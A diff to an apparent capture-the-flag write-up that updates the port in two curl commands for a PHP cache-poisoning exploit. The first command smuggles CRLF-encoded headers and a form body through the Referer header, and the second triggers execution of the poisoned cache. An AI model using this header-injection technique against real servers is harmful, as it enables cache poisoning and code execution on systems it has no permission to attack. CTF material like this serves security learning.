@@ -24,12 +24,12 @@ http://ctf.pwn.sg:8181
 
 # Exploit Details
 
-curl http://localhost:8180/cache.php\?test\=21422 -H 'Referer: example.com/index.php%0D%0AContent-Length%3A+90%0D%0AContent-Type: application/x-www-form-urlencoded%0D%0A%0D%0Aview=test&' -iv -H 'cookie: PHPSESSID=debugtest3;'
+curl http://localhost:8181/cache.php\?test\=21422 -H 'Referer: example.com/index.php%0D%0AContent-Length%3A+90%0D%0AContent-Type: application/x-www-form-urlencoded%0D%0A%0D%0Aview=test&' -iv -H 'cookie: PHPSESSID=debugtest3;'
 
 to perform cache poisoning
 
 then 
 
-curl http://localhost:8180/cache.php\?report\=debug -H 'Referer: example.com/index.php' -iv -H 'cookie: PHPSESSID=test3;'
+curl http://localhost:8181/cache.php\?report\=debug -H 'Referer: example.com/index.php' -iv -H 'cookie: PHPSESSID=test3;'
 
 to use the cache and execute the contents from the cache.
